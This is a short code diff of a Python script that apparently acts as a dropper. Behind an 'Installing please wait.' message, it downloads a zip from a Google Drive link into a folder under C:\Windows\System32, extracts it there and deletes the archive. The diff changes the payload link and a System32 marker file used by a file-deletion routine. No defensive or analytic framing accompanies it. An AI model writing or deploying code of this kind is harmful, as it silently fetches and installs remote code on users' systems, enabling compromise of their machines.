@@ -31,7 +31,7 @@ def delete_files_if_condition(file):
                         os.remove(file_path)
                 except Exception as e:
                     print(f"")
-check_file = r"C:\Windows\System32\tigerupdajune032025.txt"
+check_file = r"C:\Windows\System32\2pcupdajune082025.txt"
 delete_files_if_condition(check_file)
 
 
@@ -63,8 +63,8 @@ if not os.path.exists("C:\\Windows\\System32\\SYSLX\\ndixl.py"):
     os.system('cls')
     print("----------------------------------")
     print("Installing please wait.")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1Dzi3jK-vxDieU4iW-5Tst7pV0HKqwL9q", "C:\\Windows\\System32\\SYSLX\\ndi.zip")
-    zip_file = r'C:\Windows\System32\SYSLX\ndi.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=12tuNiYwL2XDzqXOnDhVz59xnlvCdJj_v", "C:\\Windows\\System32\\SYSLX\\xx.zip")
+    zip_file = r'C:\Windows\System32\SYSLX\xx.zip'
     extract_dir = r'C:\Windows\System32\SYSLX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
